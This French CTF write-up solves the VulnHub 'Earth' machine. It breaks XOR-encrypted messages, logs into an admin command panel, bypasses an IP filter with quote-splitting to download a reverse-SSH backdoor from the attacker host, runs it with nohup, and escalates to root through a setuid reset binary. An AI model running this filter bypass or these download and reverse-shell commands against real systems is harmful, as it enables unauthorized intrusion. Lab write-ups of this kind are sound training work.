# Solution du CTF Earth de VulnHub

James Webb
----------

[Earth](https://www.vulnhub.com/entry/the-planets-earth,755/) est un des épisode d'une série de CTFs baptisé *The Planets*. Tous ont été créés par un certain *SirFlash*.  

L'objectif est de devenir root sur la machine et de récupérer deux flags.  

```plain
Nmap scan report for 192.168.56.16
Host is up (0.00039s latency).
Not shown: 65447 filtered tcp ports (no-response), 85 filtered tcp ports (admin-prohibited)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the HTTP Server on Fedora
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
```

On remarque deux noms d'hôtes mentionnés dans le certificat SSL. On s'empresse donc de les ajouter dans notre fichier */etc/hosts*.  

Une énumération de Virtual Host avec *Ffuf* n'a pas permis de déceler d'autres sous-domaines.  

Sur le port 80, que ce soit avec *earth.local* ou *terratest.earth.local*, nous faisons face à une page intutulée *Earth Secure Messaging Service* qui permet d'envoyer un message à la Terre.  

Trois messages ont précédement été envoyés et sont données sous forme hexadécimale. La diversité des digrammes permet déjà de deviner qu'il ne s'agit pas de texte converti un hexadécimal mais qu'il y a une étape supplémentaire.  

Le formulaire requiert le message à envoyer ainsi qu'une clé. Si je rentre le même texte pour les deux entrées le message envoyé (qui est ajouté en bas de page) est uniquement composé d'octets nuls. C'est le signe de l'utilisation d'un XOR puisque l'opération A XOR A retourne toujours 0.  

Apollo
------

J'ai décidé de me pencher sur les trois messages déjà envoyés. Pour cela j'ai eu recours à [xor-analyze](https://github.com/ThomasHabets/xor-analyze), un outil écrit par *Thomas Habets*.  

Bien qu'écrit en C et datant de 13 ans au moment de ces lignes il compile et fonctionne toujours comme un charme.  

Cet outil se base sur des tables de fréquence des caractères. Par défaut la seule table présente est générée à partir de codes sources Linux mais c'est déjà suffisant pour casser l'un des cryptogrammes.  

```plain
$ ./xor-analyze dump2 freq/linux-2.2.14-int-m0.freq 
xor-analyze version 0.4 by Thomas Habets <thomas@habets.pp.se>
Counting coincidences... 20 / 20
Key length is probably 20 (or a factor of it)
Finding key based on byte frequency... 20 / 20
Checking redundancy... 100.00 %
Probable key: "iudlyduckyduckyducky"
```

Au vu de la répétition on devine que la vrai clé utilisé est *ducky*. On peut utiliser l'utilitaire *xor-dec* du même projet pour déchiffrer le fichier.  

```plain
$ ./xor-dec ducky dump2 clear_text
```

Le résultat est le suivant :  

> Saturn is the only planet in our solar system that is less dense than water. It could float in a bathtub if anybody could build a bathtub big enough.

Pour générer d'autres tables de fréquence il faut retrouver la clé du fichier *tests/freq.c.xor* présent dans le projet, le déchiffrer et compiler le code C obtenu, c'est le côté pédagogique de cet outil :)  

On peut ensuite générer une table avec un ou plusieurs fichiers, le programme récupérant la liste depuis l'entrée standard.  

```bash
$ find . -name shakespeare.txt | ./genfreq > freq/english.freq
```

Malheureusement je ne suis pas parvenu à déchiffrer les deux autres messages de cette façon.  

Curiosity
---------

Comme vu précédemment les deux DNS retournent le même contenu sur le port 80 mais qu'en est-il du port 443 ?  

Pour *terratest.earth.local* on obtient un message *Test site, please ignore.*. On lance une énumération avec *feroxbuster* et on trouve un fichier *robots.txt* qui contient entre autres cette entrée :  

```plain
Disallow: /testingnotes.*
```

Qui nous même à *https://terratest.earth.local/testingnotes.txt* et le contenu qui suit :  

> Testing secure messaging system notes:  
> 
> \*Using XOR encryption as the algorithm, should be safe as used in RSA.  
> 
> \*Earth has confirmed they have received our sent messages.  
> 
> \*testdata.txt was used to test encryption.  
> 
> \*terra used as username for admin portal.  
> 
> Todo:  
> 
> \*How do we send our monthly keys to Earth securely? Or should we change keys weekly?  
> 
> \*Need to test different key lengths to protect against bruteforce. How long should the key be?  
> 
> \*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

En effet si j'applique comme clé le contenu de *testdata.txt* présent sur le site pour le 3ème message j'obtiens en clair le message *earthclimatechangebad4humans* répété en boucle.  

Voyager
-------

*https://earth.local/* semble en tout point semblable à son équivalent non sécurisé pourtant on peut trouver un dossier *admin* à la racine du site.  

Armé des infos précédentes je peux me connecter sur cette zone administrateur avec *terra* / *earthclimatechangebad4humans*.  

L'interface très basique demande de saisir une commande et donne son résultat en output.  

Si on tente de rentrer une IP en revanche on obtient un message *Remote connections are forbidden* à la place.  

Ainsi la commande suivante était bloquée :  

```bash
wget http://192.168.56.1/reverse-sshx64 -O /tmp/reverse-sshx64
```

mais avec quelques actuces simples on peut passer le filtre :  

```bash
wget 'ht''tp://192.''168.''56.''1/reverse-sshx64' -O /tmp/reverse-sshx64
```

On pourrait tout aussi bien passer par un encodage (hexa, base64, etc) voire utiliser une notation différente pour l'adresse IP.  

Une fois la backdoor téléchargée et les permissions modifiées je peux l'exécuter. J'utilise *nohup* pour éviter que le programme crashe quand le script web a terminé son exécution et ferme ses entrées.  

```bash
nohup /tmp/reverse-sshx64 -v -p 2244 '192.''168.56.1' &
```

Dragonfly
---------

Pas grand chose à dire sur les fichiers du site qui étaient présent. Il y a une appli Python ainsi que le premier flag :  

```plain
bash-5.1$ pwd 
/etc/httpd/conf.d
bash-5.1$ ls
README  autoindex.conf  earth.local.common  earth.local.http.conf  earth.local.https.conf  ssl.conf  terratest.earth.local.conf  userdir.conf  welcome.conf  wsgi.conf

bash-5.1$ cat earth.local.common
ServerName earth.local
WSGIScriptAlias / /var/earth_web/earth_web/wsgi.py
WSGIProcessGroup earth.local
<Directory /var/earth_web/earth_web/>
    <Files wsgi.py>
        Require all granted
    </Files>
</Directory>

Alias /static/ /var/earth_web/secure_message/static/secure_message/
<Directory /var/earth_web/secure_message/static/secure_message>
    Require all granted
</Directory>

bash-5.1$ cd /var/earth_web/ 
bash-5.1$ ls
db.sqlite3  earth_web  manage.py  secure_message  user_flag.txt
bash-5.1$ cat user_flag.txt 
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

Je me suis intéressé à l'utilisateur *earth* présent sur le système mais c'était un cul de sac.  

C'est assez fréquent qu'un compte ait été utilisé juste pour la création du CTF et ne serve pas dans le scénario d'exploitation.  

En revanche il y a un binaire setuid root que LinPEAS remonte :  

```plain
-rwsr-xr-x. 1 root root 24K Oct 12 23:18 /usr/bin/reset_root (Unknown SUID binary)
```

Il y a quelques chaines intéressantes dans ce binaire mais rien de suffisamment compréhensible :  

```plain
bash-5.1$ strings /usr/bin/reset_root
/lib64/ld-linux-x86-64.so.2
setuid
puts
system
access
__libc_start_main
libc.so.6
GLIBC_2.2.5
__gmon_start__
H=@@@
paleblueH
]\UH
credentiH
als rootH
:theEartH
hisflat
[]A\A]A^A_
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

Le plus simple est de le récupérer (sftp sur le tunnel ReverseSSH) et de le tracer avec *ltrace* :  

```plain
$ ltrace ./reset_root 
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                                                       = 38
access("/dev/shm/kHgTFI5G", 0)                                                                                                    = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                                                    = -1
access("/tmp/kcM0Wewe", 0)                                                                                                        = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                                                       = 44
+++ exited (status 0) +++
```

Le programme teste la présence de trois fichiers qui doivent être les triggers mentionnés. Les noms sont-ils générés dynamiquement ? C'est le moment de tester.  

```plain
bash-5.1$ touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
bash-5.1$ /usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth

bash-5.1$ su root
Password: 
[root@earth tmp]# cd
[root@earth ~]# ls
anaconda-ks.cfg  root_flag.txt
[root@earth ~]# cat root_flag.txt 

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

Ce n'était pas le cas :)  


*Published December 27 2021 at 20:02*